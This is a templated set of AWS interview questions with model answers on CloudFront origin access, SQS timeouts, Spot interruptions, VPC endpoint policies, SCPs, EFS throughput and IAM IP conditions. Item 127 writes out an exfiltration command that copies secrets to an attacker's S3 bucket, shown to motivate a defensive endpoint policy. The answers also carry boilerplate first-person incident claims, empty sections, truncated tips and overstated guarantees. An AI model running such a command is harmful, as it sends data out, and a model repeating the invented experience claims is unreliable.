<a id="scenario-122-aws-q106-to-secure-an-s3-bucket-powering-a-static-website-you-put-cloudfront-in-front-of-it-how-do-you-strictly-guarantee-that-users-can-never-bypass-cloudfront-and-access-the-s3-bucket-directly-via-its-public-url-l2"></a>
### 122. AWS Q106: To secure an S3 bucket powering a static website you put CloudFront in front of it How do you strictly guarantee that users can never bypass CloudFront and access the S3 bucket directly via its public URL [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"To secure an S3 bucket powering a static website, you put CloudFront in front of it. How do you strictly guarantee that users can never bypass CloudFront and access the S3 bucket directly via its public URL?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. The interviewer is testing: Origin Access Control (OAC), S3 Bucket Policies.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

You must implement **Origin Access Control (OAC)** (the modern replacement for Origin Access Identity, OAI).

- Block all Public Access directly on the S3 bucket.
- In CloudFront, configure the S3 Origin to strictly use an OAC.
- Update the S3 Bucket Policy to explicitly grant `s3:GetObject` permission strictly to the Principal `cloudfront.amazonaws.com`, utilizing a `Condition` block that enforces `StringEquals: AWS:SourceArn` matching the specific ARN of your CloudFront distribution.

##### 2️⃣ Remediation & Permanent Safeguards

This mathematically guarantees that the bucket will aggressively reject any request that didn't natively originate from your precise CloudFront distribution. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Block all Public Access directly on the S3 bucket..

#### ⏱️ 60-Second Elevator Pitch Summary

- Block all Public Access directly on the S3 bucket.
- In CloudFront, configure the S3 Origin to strictly use an OAC.
- Update the S3 Bucket Policy to explicitly grant s3:GetObject permission strictly to the Principal...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-123-aws-q107-an-engineer-argues-that-if-they-upload-a-file-to-s3-and-immediately-trigger-a-lambda-function-to-read-that-file-the-lambda-might-violently-crash-with-a-404-not-found-due-to-s3s-eventual-consistency-are-they-correct-l1"></a>
### 123. AWS Q107: An engineer argues that if they upload a file to S3 and immediately trigger a Lambda function to read that file the Lambda might violently crash with a 404 Not Found due to S3s Eventual Consistency Are they correct [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Cost & Architecture` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An engineer argues that if they upload a file to S3 and immediately trigger a Lambda function to read that file, the Lambda might violently crash with a `404 Not Found` due to S3's "Eventual Consistency". Are they correct?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. The interviewer is testing: Modern S3 consistency models (Strong Consistency).. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

**No.** They are referencing outdated architecture. As of December 2020, Amazon S3 provides **Strong Read-After-Write Consistency** automatically for all `PUT` and `DELETE` requests globally. If an application uploads a file successfully (receiving an HTTP 200), any subsequent `GET` request, even a millisecond later from a Lambda function, is mathematically guaranteed to see the file. Eventual consistency is no longer an issue in standard S3 operations. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: No. They are referencing outdated architecture..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: No. They are referencing outdated architecture.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-124-aws-q108-your-ec2-auto-scaling-group-asg-dynamically-scales-down-during-the-night-however-when-it-terminates-an-instance-active-users-downloading-large-files-are-abruptly-violently-disconnected-how-do-you-gracefully-drain-those-connections-l3"></a>
### 124. AWS Q108: Your EC2 Auto Scaling Group (ASG) dynamically scales down during the night However when it terminates an instance active users downloading large files are abruptly violently disconnected How do you gracefully drain those connections [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your EC2 Auto Scaling Group (ASG) dynamically scales down during the night. However, when it terminates an instance, active users downloading large files are abruptly violently disconnected. How do you gracefully drain those connections?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. The interviewer is testing: ASG Lifecycle Hooks, ALB Deregistration Delay.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This requires a two-part solution utilizing application load balancing and ASG native hooks:

- **ALB Deregistration Delay (Connection Draining):** On the ALB Target Group, configure a deregistration delay (e.g., 300 seconds). When the instance is marked for termination, the ALB stops sending *new* requests to it, but keeps the instance alive in a "draining" state allowing active downloads to finish cleanly.
- **ASG Lifecycle Hooks:** Add a `Terminating` Lifecycle Hook to the ASG. This intercepts the EC2 termination command and puts the instance into a `Terminating:Wait` state. The instance runs a shutdown script to naturally close stateful background workers, flush caches to Redis, and finally sends a `CompleteLifecycleAction` API call to AWS, allowing the instance to securely power off.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: ALB Deregistration Delay (Connection Draining): On the ALB Target Group, configure a deregistration delay (e.g., 300 seconds). Whe.

#### ⏱️ 60-Second Elevator Pitch Summary

- ALB Deregistration Delay (Connection Draining): On the ALB Target Group, configure a deregistrati...
- ASG Lifecycle Hooks: Add a Terminating Lifecycle Hook to the ASG. This intercepts the EC2 termina...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-125-aws-q109-you-have-an-sqs-queue-triggering-a-lambda-function-to-encode-massive-video-files-sometimes-a-video-takes-8-minutes-to-encode-you-randomly-notice-the-exact-same-video-being-encoded-simultaneously-by-two-different-lambda-functions-why-l2"></a>
### 125. AWS Q109: You have an SQS queue triggering a Lambda function to encode massive video files Sometimes a video takes 8 minutes to encode You randomly notice the exact same video being encoded simultaneously by two different Lambda functions Why [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You have an SQS queue triggering a Lambda function to encode massive video files. Sometimes a video takes 8 minutes to encode. You randomly notice the exact same video being encoded simultaneously by two different Lambda functions. Why?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. The interviewer is testing: SQS Visibility Timeout.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

The **SQS Visibility Timeout** is misconfigured. When a Lambda polls SQS, the message doesn't delete immediately; it becomes "invisible" to other consumers for the duration of the Visibility Timeout (default 30 seconds). Because the video encode takes 8 minutes, the 30-second timeout expires violently mid-encode. SQS assumes the first Lambda quietly crashed, making the message instantly visible again. A second Lambda picks up the identical message and starts encoding it. *Fix:* You must increase the SQS Visibility Timeout to be strictly greater than the maximum theoretical runtime of the Lambda function (e.g., set it to 10 minutes, or 600 seconds). ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The SQS Visibility Timeout is misconfigured..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: The SQS Visibility Timeout is misconfigured.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-126-aws-q110-to-save-70-on-compute-costs-you-heavily-adopt-ec2-spot-instances-for-your-stateless-batch-processing-data-pipeline-however-aws-can-arbitrarily-terminate-spot-instances-when-they-need-capacity-back-how-can-you-ensure-your-batch-jobs-dont-leave-databases-in-a-corrupted-state-when-killed-l2"></a>
### 126. AWS Q110: To save 70% on compute costs you heavily adopt EC2 Spot Instances for your stateless batch processing data pipeline However AWS can arbitrarily terminate Spot instances when they need capacity back How can you ensure your batch jobs dont leave databases in a corrupted state when killed [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"To save 70% on compute costs, you heavily adopt EC2 Spot Instances for your stateless batch processing data pipeline. However, AWS can arbitrarily terminate Spot instances when they need capacity back. How can you ensure your batch jobs don't leave databases in a corrupted state when killed?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. The interviewer is testing: Spot Instance Interruption Notices.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

AWS natively provides a **2-Minute Spot Instance Interruption Notice** before the instance is forcefully terminated.

- The application or a background daemon must constantly poll the local EC2 Instance Metadata Service (IMDS) at `http://169.254.169.254/latest/meta-data/spot/instance-action` or listen for EventBridge events.
- When the 2-minute warning appears, the application must immediately stop accepting new batch jobs, gracefully checkpoint its current processing state to DynamoDB/S3, safely roll back incomplete database transactions, and disconnect.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The application or a background daemon must constantly poll the local EC2 Instance Metadata Service (IMDS) at http://169.254.169.2.

#### ⏱️ 60-Second Elevator Pitch Summary

- The application or a background daemon must constantly poll the local EC2 Instance Metadata Servi...
- When the 2-minute warning appears, the application must immediately stop accepting new batch jobs...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-127-aws-q111-an-auditor-requires-that-no-ec2-instance-in-a-private-vpc-subnet-can-exfiltrate-data-to-an-unauthorized-s3-bucket-you-map-a-vpc-gateway-endpoint-to-s3-how-do-you-actually-enforce-the-restriction-to-your-specific-bucket-l3"></a>
### 127. AWS Q111: An auditor requires that no EC2 instance in a private VPC subnet can exfiltrate data to an unauthorized S3 bucket You map a VPC Gateway Endpoint to S3 How do you actually enforce the restriction to your specific bucket [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An auditor requires that no EC2 instance in a private VPC subnet can exfiltrate data to an unauthorized S3 bucket. You map a VPC Gateway Endpoint to S3. How do you actually enforce the restriction to your specific bucket?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. The interviewer is testing: VPC Endpoint Policies.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Creating a VPC Endpoint simply keeps the traffic on the AWS private backbone; it does not secure it inherently. An attacker could still run `aws s3 cp secrets.txt s3://attacker-bucket`. To enforce security, you must attach a strict **VPC Endpoint Policy** (a resource policy) directly to the VPC Gateway Endpoint. The policy must explicitly `Deny` all `s3:PutObject` actions unless the `Resource` ARN exactly matches your authorized corporate bucket (`arn:aws:s3:::my-secure-corporate-bucket/*`). This guarantees that even if a developer inputs credentials for an external AWS account, the VPC network layer will aggressively drop the traffic. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Creating a VPC Endpoint simply keeps the traffic on the AWS private backbone; it does not secure it inherently. An attacker could .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Creating a VPC Endpoint simply keeps the traffic on the AWS private backbone; it does not secur
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-128-aws-q112-you-create-a-dynamodb-table-heavily-queried-by-userid-months-later-the-business-wants-to-query-by-emailaddress-you-go-to-add-a-local-secondary-index-lsi-but-the-aws-console-firmly-prevents-you-why-l2"></a>
### 128. AWS Q112: You create a DynamoDB table heavily queried by UserID Months later the business wants to query by EmailAddress You go to add a Local Secondary Index (LSI) but the AWS console firmly prevents you Why [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You create a DynamoDB table heavily queried by `UserID`. Months later, the business wants to query by `EmailAddress`. You go to add a Local Secondary Index (LSI) but the AWS console firmly prevents you. Why?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. The interviewer is testing: Global (GSI) vs Local (LSI) Index immutability constraints.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

**Local Secondary Indexes (LSIs)** are deeply embedded into the physical partition layout of the original DynamoDB table (forcing the same Partition Key, but allowing a new Sort Key). Because of this physical constraint, LSIs **must** be created at the exact moment the table is initially created. They are entirely immutable and cannot be added later. *Fix:* You must instead create a **Global Secondary Index (GSI)**. GSIs are essentially asynchronous replica tables maintained by AWS under the hood. They can be dynamically added or securely deleted at any time with zero downtime to the primary table. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Local Secondary Indexes (LSIs) are deeply embedded into the physical partition layout of the original DynamoDB table (forcing the .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Local Secondary Indexes (LSIs) are deeply embedded into the physical partition layout of the or
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-129-aws-q113-your-company-uses-aws-organizations-you-log-in-as-the-absolute-overarching-root-user-of-a-member-account-and-try-to-delete-a-cloudtrail-log-but-you-violently-receive-an-access-denied-error-how-is-the-root-user-denied-permission-l2"></a>
### 129. AWS Q113: Your company uses AWS Organizations You log in as the absolute overarching Root User of a member account and try to delete a CloudTrail log but you violently receive an Access Denied error How is the Root User denied permission [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your company uses AWS Organizations. You log in as the absolute overarching Root User of a member account and try to delete a CloudTrail log, but you violently receive an `Access Denied` error. How is the Root User denied permission?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. The interviewer is testing: Service Control Policies (SCPs) overriding Root.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is the immense power of **Service Control Policies (SCPs)** administered from the AWS Organizations Management (Master) account. An SCP operates as an invisible, overarching boundary. If an SCP applied at the Organization or OU level possesses an explicit `Deny` for `cloudtrail:DeleteTrail`, it forcefully supersedes everything below it. It mathematically strips that permission away from *every* entity inside the member account—expressly including the usually omnipotent Root User and Administrator IAM Roles. Only the supreme administrators of the overarching Management Account can alter the SCP. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is the immense power of Service Control Policies (SCPs) administered from the AWS Organizations Management (Master) account..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is the immense power of Service Control Policies (SCPs) administered from the AWS Organiza
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-130-aws-q114-an-application-successfully-utilizes-aws-efs-elastic-file-system-for-shared-wordpress-storage-it-performs-beautifully-for-3-months-then-suddenly-grinds-to-a-catastrophic-halt-dropping-to-1-mb-s-throughput-daily-why-l3"></a>
### 130. AWS Q114: An application successfully utilizes AWS EFS (Elastic File System) for shared WordPress storage It performs beautifully for 3 months then suddenly grinds to a catastrophic halt dropping to 1 MB/s throughput daily Why [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An application successfully utilizes AWS EFS (Elastic File System) for shared WordPress storage. It performs beautifully for 3 months, then suddenly grinds to a catastrophic halt, dropping to 1 MB/s throughput daily. Why?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. The interviewer is testing: EFS Burst Credits and Baseline Throughput.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

The application has exhausted its **EFS Burst Credits**. By default, EFS operates in "Bursting Throughput" mode. You are constantly awarded credits based purely on how much data you store. If you only store 10 GB of data, your baseline throughput is a microscopic 0.5 MB/s. The application was heavily utilizing accrued "Burst" credits (up to 100 MB/s) to mask the low baseline. After 3 months of heavy traffic, the credit bank hit absolute zero. *Fix:* Immediately switch the EFS configuration mode from "Bursting" to **Provisioned Throughput** (e.g., paying for a guaranteed 50 MB/s regardless of storage size) or "Elastic Throughput" mode to instantly restore performance. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The application has exhausted its EFS Burst Credits..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: The application has exhausted its EFS Burst Credits.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-131-aws-q115-a-serverless-payment-gateway-workflow-occasionally-takes-up-to-3-days-to-resolve-because-it-waits-heavily-for-manual-human-approval-should-you-use-aws-step-functions-standard-or-express-workflows-l2"></a>
### 131. AWS Q115: A serverless payment gateway workflow occasionally takes up to 3 days to resolve because it waits heavily for manual human approval Should you use AWS Step Functions Standard or Express Workflows [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A serverless payment gateway workflow occasionally takes up to 3 days to resolve because it waits heavily for manual human approval. Should you use AWS Step Functions Standard or Express Workflows?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. The interviewer is testing: Step Function workflow duration limits.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

You must undeniably use **Standard Workflows**.

- **Standard Workflows:** Support extremely long-running, auditable executions that can pause and wait cleanly for up to **1 year**. They are billed per transition, making them perfect for manual human approval steps and long-polling.
- **Express Workflows:** Are designed explicitly for massive, high-volume event processing (thousands per second). Their absolute maximum execution duration is capped violently at **5 minutes**. They would time out instantly in this scenario.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Standard Workflows: Support extremely long-running, auditable executions that can pause and wait cleanly for up to 1 year. They ar.

#### ⏱️ 60-Second Elevator Pitch Summary

- Standard Workflows: Support extremely long-running, auditable executions that can pause and wait ...
- Express Workflows: Are designed explicitly for massive, high-volume event processing (thousands p...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-132-aws-q116-you-enabled-aws-cloudtrail-across-your-organization-however-when-you-search-the-logs-to-find-out-who-uploaded-a-specific-image-logopng-into-an-s3-bucket-nothing-appears-you-only-see-bucket-creation-events-where-is-the-log-l2"></a>
### 132. AWS Q116: You enabled AWS CloudTrail across your organization However when you search the logs to find out who uploaded a specific image logopng into an S3 bucket nothing appears You only see bucket creation events Where is the log [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You enabled AWS CloudTrail across your organization. However, when you search the logs to find out who uploaded a specific image `logo.png` into an S3 bucket, nothing appears. You only see bucket creation events. Where is the log?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. The interviewer is testing: Management Events vs Data Events.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

By default, CloudTrail only records **Management Events** (Control Plane actions). These include creating infrastructure (`CreateBucket`, `RunInstances`, `UpdateSecurityGroup`). It natively ignores **Data Events** (Data Plane actions) like `s3:GetObject`, `s3:PutObject`, or `dynamodb:PutItem` because logging trillions of them would result in astronomical CloudTrail bills. To see the `logo.png` upload, you must explicitly edit the CloudTrail configuration and opt-in to paying to record **Data Events** specifically targeting that S3 bucket. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: By default, CloudTrail only records Management Events (Control Plane actions). These include creating infrastructure (CreateBucket.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: By default, CloudTrail only records Management Events (Control Plane actions). These include cr
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-133-aws-q117-in-amazon-ecs-what-is-the-exact-difference-between-the-task-role-and-the-task-execution-role-l1"></a>
### 133. AWS Q117: In Amazon ECS what is the exact difference between the Task Role and the Task Execution Role [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Cost & Architecture` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"In Amazon ECS, what is the exact difference between the "Task Role" and the "Task Execution Role"?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. The interviewer is testing: IAM segmentation in container orchestration.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Both roles serve entirely different isolation boundaries:

- **Task Execution Role:** Used entirely by the ECS/Fargate *Agent* (the infrastructure) *before* your code runs. It needs permissions strictly to pull the Docker image from ECR and natively push the container logs up to CloudWatch.
- **Task Role:** Used directly by *Your Application Code* once the container boots up. If your Python script running inside the container needs to read an S3 bucket or query DynamoDB, those precise permissions must reside exclusively on this role.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Task Execution Role: Used entirely by the ECS/Fargate *Agent* (the infrastructure) *before* your code runs. It needs permissions s.

#### ⏱️ 60-Second Elevator Pitch Summary

- Task Execution Role: Used entirely by the ECS/Fargate *Agent* (the infrastructure) *before* your ...
- Task Role: Used directly by *Your Application Code* once the container boots up. If your Python s...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-134-aws-q118-a-fleet-of-5000-lambda-functions-in-a-private-vpc-aggressively-scrape-data-from-the-public-internet-randomly-hundreds-of-them-begin-crashing-with-bizarre-connection-timed-out-networking-errors-despite-the-internet-destination-being-perfectly-healthy-what-aws-bottleneck-is-occurring-l3"></a>
### 134. AWS Q118: A fleet of 5000 Lambda functions in a private VPC aggressively scrape data from the public internet Randomly hundreds of them begin crashing with bizarre Connection Timed Out networking errors despite the internet destination being perfectly healthy What AWS bottleneck is occurring [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A fleet of 5,000 Lambda functions in a private VPC aggressively scrape data from the public internet. Randomly, hundreds of them begin crashing with bizarre `Connection Timed Out` networking errors, despite the internet destination being perfectly healthy. What AWS bottleneck is occurring?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. The interviewer is testing: NAT Gateway SNAT Port Exhaustion.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is classic **SNAT (Source Network Address Translation) Port Exhaustion** on the NAT Gateway. A single AWS NAT Gateway utilizes a single public Elastic IP. TCP allows a theoretical maximum of ~65,000 ephemeral outbound ports per IP addressing a single destination. When 5,000 highly concurrent Lambda functions open thousands of individual API connections to the exact same external internet API simultaneously, the NAT Gateway completely runs out of ephemeral routing ports. It violently drops any new outbound connection attempts until old ones close. *Fix:* Heavily deploy multiple NAT Gateways across multiple public subnets and route traffic dynamically to distribute the SNAT allocation, or deploy dedicated NAT instances. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is classic SNAT (Source Network Address Translation) Port Exhaustion on the NAT Gateway..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is classic SNAT (Source Network Address Translation) Port Exhaustion on the NAT Gateway.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-135-aws-q119-you-want-to-ensure-that-a-highly-powerful-iam-administrative-user-can-only-execute-critical-api-calls-if-they-are-physically-situated-in-the-corporate-headquarters-how-do-you-enforce-this-natively-in-iam-l2"></a>
### 135. AWS Q119: You want to ensure that a highly powerful IAM Administrative User can only execute critical API calls if they are physically situated in the corporate headquarters How do you enforce this natively in IAM [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You want to ensure that a highly powerful IAM Administrative User can only execute critical API calls if they are physically situated in the corporate headquarters. How do you enforce this natively in IAM?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. The interviewer is testing: IAM Condition Keys (`aws:SourceIp`).. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

You would append a `Condition` block to their overarching IAM Policy (or a global SCP) that heavily restricts authentication based on their explicit IP address. If the policy is an explicit `Deny` with a `NotIpAddress` condition, any devastating `ec2:Terminate*` or `s3:Delete*` AWS API calls originating from a coffee shop IP address are aggressively rejected by AWS IAM instantly. ---

```bash
"Condition": {
    "NotIpAddress": {
        "aws:SourceIp": ["203.0.113.50/32"]
    }
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: You would append a Condition block to their overarching IAM Policy (or a global SCP) that heavily restricts authentication based o.

#### ⏱️ 60-Second Elevator Pitch Summary

